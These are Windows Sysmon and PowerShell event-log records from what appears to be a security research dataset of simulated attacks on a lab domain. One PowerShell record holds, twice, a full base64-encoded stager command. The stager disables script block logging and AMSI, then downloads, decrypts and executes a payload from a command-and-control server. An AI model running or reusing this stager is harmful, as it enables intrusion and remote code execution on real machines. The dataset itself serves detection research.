{"EventID": 10, "RecordNumber": 426949, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "SourceName": "Microsoft-Windows-Sysmon", "OpcodeValue": 0, "AccountName": "SYSTEM", "SourceImage": "C:\\Windows\\System32\\RuntimeBroker.exe", "SourceModuleName": "eventlog", "ExecutionProcessID": 3524, "AccountType": "User", "Category": "Process accessed (rule: ProcessAccess)", "SourceProcessId": "9496", "Domain": "NT AUTHORITY", "port": 60427, "ThreadID": 4688, "Severity": "INFO", "EventType": "INFO", "Channel": "Microsoft-Windows-Sysmon/Operational", "Opcode": "Info", "EventReceivedTime": "2020-09-14 08:06:32", "Task": 10, "RuleName": "-", "Keywords": -9223372036854775808, "Version": 3, "ProcessId": "9496", "tags": ["mordorDataset"], "GrantedAccess": "0x1000", "SourceProcessGUID": "{2d351099-5cc0-5f5f-3b04-000000000400}", "EventTime": "2020-09-14 08:06:30", "host": "wec.internal.cloudapp.net", "SeverityValue": 2, "CallTrace": "C:\\windows\\SYSTEM32\\ntdll.dll+9d104|C:\\windows\\System32\\RPCRT4.dll+2d2f4|C:\\windows\\System32\\combase.dll+b84ab|C:\\windows\\System32\\windows.storage.dll+12edf4|C:\\windows\\System32\\windows.storage.dll+12ed2c|C:\\windows\\System32\\windows.storage.dll+63826|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+38359|C:\\windows\\System32\\combase.dll+a5cbf|C:\\windows\\System32\\RPCRT4.dll+59b4b|C:\\windows\\System32\\combase.dll+8d0a3|C:\\windows\\System32\\combase.dll+8ce93|C:\\windows\\System32\\combase.dll+a9516|C:\\windows\\System32\\combase.dll+8a4ba|C:\\windows\\System32\\combase.dll+8b17d|C:\\windows\\System32\\combase.dll+4019c|C:\\windows\\System32\\combase.dll+40a01|C:\\windows\\System32\\combase.dll+62f6d|C:\\windows\\System32\\user32.dll+15c7d|C:\\windows\\System32\\user32.dll+15672|C:\\windows\\System32\\shcore.dll+cbac|C:\\windows\\System32\\shcore.dll+c1c8|C:\\windows\\System32\\shcore.dll+a7e3", "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-14 12:06:30.989\r\nSourceProcessGUID: {2d351099-5cc0-5f5f-3b04-000000000400}\r\nSourceProcessId: 9496\r\nSourceThreadId: 6280\r\nSourceImage: C:\\Windows\\System32\\RuntimeBroker.exe\r\nTargetProcessGUID: {2d351099-5cc2-5f5f-3d04-000000000400}\r\nTargetProcessId: 5696\r\nTargetImage: C:\\windows\\system32\\BackgroundTransferHost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9d104|C:\\windows\\System32\\RPCRT4.dll+2d2f4|C:\\windows\\System32\\combase.dll+b84ab|C:\\windows\\System32\\windows.storage.dll+12edf4|C:\\windows\\System32\\windows.storage.dll+12ed2c|C:\\windows\\System32\\windows.storage.dll+63826|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+38359|C:\\windows\\System32\\combase.dll+a5cbf|C:\\windows\\System32\\RPCRT4.dll+59b4b|C:\\windows\\System32\\combase.dll+8d0a3|C:\\windows\\System32\\combase.dll+8ce93|C:\\windows\\System32\\combase.dll+a9516|C:\\windows\\System32\\combase.dll+8a4ba|C:\\windows\\System32\\combase.dll+8b17d|C:\\windows\\System32\\combase.dll+4019c|C:\\windows\\System32\\combase.dll+40a01|C:\\windows\\System32\\combase.dll+62f6d|C:\\windows\\System32\\user32.dll+15c7d|C:\\windows\\System32\\user32.dll+15672|C:\\windows\\System32\\shcore.dll+cbac|C:\\windows\\System32\\shcore.dll+c1c8|C:\\windows\\System32\\shcore.dll+a7e3", "UtcTime": "2020-09-14 12:06:30.989", "UserID": "S-1-5-18", "@timestamp": "2020-09-14T12:06:32.765Z", "TargetProcessId": "5696", "SourceThreadId": "6280", "@version": "1", "TargetProcessGUID": "{2d351099-5cc2-5f5f-3d04-000000000400}", "SourceModuleType": "im_msvistalog", "TargetImage": "C:\\windows\\system32\\BackgroundTransferHost.exe", "Hostname": "WORKSTATION5.theshire.local"}
{"@version": "1", "EventType": "INFO", "Version": 1, "ThreadID": 6964, "EventTime": "2020-08-07 10:39:49", "Task": 106, "AccountType": "User", "Channel": "Microsoft-Windows-PowerShell/Operational", "SourceName": "Microsoft-Windows-PowerShell", "OpcodeValue": 20, "Hostname": "WORKSTATION5.theshire.local", "@timestamp": "2020-08-07T14:39:58.348Z", "Message": "CommandInvocation(Out-Null): \"Out-Null\"\r\nParameterBinding(Out-Null): name=\"InputObject\"; value=\"System.Reflection.Emit.FieldBuilder\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 18d2a904-7116-4dc5-8a92-4afeea74e2f1\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = fb249e3f-a85b-4722-b17c-49b652225701\r\n        Pipeline ID = 1\r\n        Command Name = Out-Null\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 21326\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n", "Category": "Executing Pipeline", "Opcode": "To be used when operation is just executing a method", "SourceModuleName": "eventlog", "EventReceivedTime": "2020-08-07 10:39:58", "port": 60122, "AccountName": "pgustavo", "ContextInfo": "        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 18d2a904-7116-4dc5-8a92-4afeea74e2f1\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = fb249e3f-a85b-4722-b17c-49b652225701\r\n        Pipeline ID = 1\r\n        Command Name = Out-Null\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 21326\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n", "Payload": "CommandInvocation(Out-Null): \"Out-Null\"\r\nParameterBinding(Out-Null): name=\"InputObject\"; value=\"System.Reflection.Emit.FieldBuilder\"\r\n", "Domain": "THESHIRE", "ExecutionProcessID": 1648, "host": "wec.internal.cloudapp.net", "Severity": "INFO", "ActivityID": "{22CB5860-CC22-0000-DD9A-358A906BD601}", "SeverityValue": 2, "EventID": 4103, "UserID": "S-1-5-21-1363495622-3806888128-621328882-1104", "ProviderGuid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}", "RecordNumber": 12749, "SourceModuleType": "im_msvistalog", "Keywords": 0, "tags": ["mordorDataset"]}
{"SourceModuleType": "im_msvistalog", "Version": 2, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-09-04 07:30:16.317\r\nProcessGuid: {3ddc5665-ed08-5f51-f302-000000000500}\r\nProcessId: 3936\r\nImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-3125456671-949036322-3048627137-1104\\Software\\Microsoft\\SystemCertificates\\Disallowed\\CTLs", "AccountType": "User", "tags": ["mordorDataset"], "Domain": "NT AUTHORITY", "Opcode": "Info", "UserID": "S-1-5-18", "SourceName": "Microsoft-Windows-Sysmon", "Hostname": "WORKSTATION5.theshire.local", "ThreadID": 4344, "EventType": "CreateKey", "RecordNumber": 310757, "SeverityValue": 2, "SourceModuleName": "eventlog", "Keywords": -9223372036854775808, "Severity": "INFO", "OpcodeValue": 0, "AccountName": "SYSTEM", "host": "wec.internal.cloudapp.net", "EventID": 12, "ProcessId": "3936", "port": 53971, "@version": "1", "ProcessGuid": "{3ddc5665-ed08-5f51-f302-000000000500}", "Category": "Registry object added or deleted (rule: RegistryEvent)", "EventReceivedTime": "2020-09-04 03:30:17", "Task": 12, "UtcTime": "2020-09-04 07:30:16.317", "EventTime": "2020-09-04 03:30:16", "Channel": "Microsoft-Windows-Sysmon/Operational", "@timestamp": "2020-09-04T07:30:17.590Z", "EventTypeOrignal": "INFO", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "ExecutionProcessID": 3080, "RuleName": "-", "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetObject": "HKU\\S-1-5-21-3125456671-949036322-3048627137-1104\\Software\\Microsoft\\SystemCertificates\\Disallowed\\CTLs"}
{"@timestamp": "2020-10-22T08:30:42.737Z", "ProcessId": "5384", "OpcodeValue": 0, "AccountName": "SYSTEM", "port": 58121, "AccountType": "User", "Severity": "INFO", "TargetObject": "HKU\\S-1-5-21-2323213074-4052461197-1785501644-1104\\Software\\Policies\\Microsoft\\SystemCertificates\\Disallowed\\Certificates", "EventTime": "2020-10-22 04:30:01", "SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Channel": "Microsoft-Windows-Sysmon/Operational", "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "EventReceivedTime": "2020-10-22 04:30:42", "ExecutionProcessID": 3616, "UtcTime": "2020-10-22 08:30:01.052", "EventID": 12, "Category": "Registry object added or deleted (rule: RegistryEvent)", "tags": ["mordorDataset"], "SeverityValue": 2, "Keywords": -9223372036854775808, "EventType": "CreateKey", "Version": 2, "SourceModuleName": "eventlog", "SourceModuleType": "im_msvistalog", "Domain": "NT AUTHORITY", "host": "wec.internal.cloudapp.net", "EventTypeOrignal": "INFO", "RecordNumber": 748378, "ThreadID": 4132, "Task": 12, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-10-22 08:30:01.052\r\nProcessGuid: {fddc55f3-4306-5f91-1906-000000000400}\r\nProcessId: 5384\r\nImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-2323213074-4052461197-1785501644-1104\\Software\\Policies\\Microsoft\\SystemCertificates\\Disallowed\\Certificates", "Hostname": "MORDORDC.theshire.local", "RuleName": "-", "@version": "1", "UserID": "S-1-5-18", "ProcessGuid": "{fddc55f3-4306-5f91-1906-000000000400}", "Opcode": "Info"}
